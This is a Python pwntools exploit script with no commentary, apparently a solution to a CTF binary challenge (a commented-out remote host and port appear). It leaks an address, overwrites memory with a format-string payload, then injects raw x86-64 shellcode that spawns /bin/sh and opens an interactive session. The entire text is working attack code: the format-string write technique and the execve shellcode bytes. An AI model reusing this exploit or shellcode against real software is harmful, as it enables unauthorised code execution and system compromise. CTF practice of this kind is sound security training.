from pwn import *
context.log_level = 'debug'

p="./elf"
context.binary=p
io=process(p)
#io=remote("111.198.29.45",49477)
io.recvuntil("secret[0] is ")
n=io.recvuntil("\n")
print "addr:"+n[:-1]
addr=int(n[:-1],16)
print hex(addr)
io.recvuntil("name be:")
io.sendline("tease")
io.recvuntil("up?:")
io.sendline("east")
io.recvuntil("leave(0)?:")
io.sendline("1")
io.recvuntil("'Give me an address'")
io.sendline(str(addr))
io.recvuntil("wish is:")
payload=fmtstr_payload(7, {addr:85}) 
#io.sendline( "%85c" + "%7$n")
io.sendline(payload)
io.recvuntil("SPELL")
shellcode=shellcraft.sh()
io.sendline("\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05")
io.interactive()
